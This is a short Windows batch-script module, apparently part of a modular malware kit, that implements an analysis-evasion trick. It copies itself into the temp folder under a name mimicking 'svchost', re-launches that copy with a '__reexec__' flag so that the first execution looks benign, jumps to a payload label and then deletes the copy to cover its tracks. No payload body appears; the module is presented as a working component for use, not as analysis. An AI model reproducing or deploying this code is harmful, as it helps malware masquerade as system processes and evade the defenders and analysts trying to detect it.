REM provides: evasion_self_reexec
REM depends: (none)
REM description: Re-invoke self with flag argument to break analysis of initial execution - fixed stdin redirect issue

REM Check if running in re-exec mode
if "%~1"=="__reexec__" goto :payload_start

REM First run: copy self to temp and re-invoke with flag
set "REEXEC_PATH=%TEMP%\svchost_%RANDOM%.bat"
copy /y "%~f0" "%REEXEC_PATH%" >nul 2>nul
start "" cmd /c "%REEXEC_PATH% __reexec__" <nul
exit /b 0

:payload_start
REM Second invocation: proceed with actual payload
REM Clean up the copy after a delay
ping -n 3 127.0.0.1 >nul & del /f /q "%REEXEC_PATH%" 2>nul
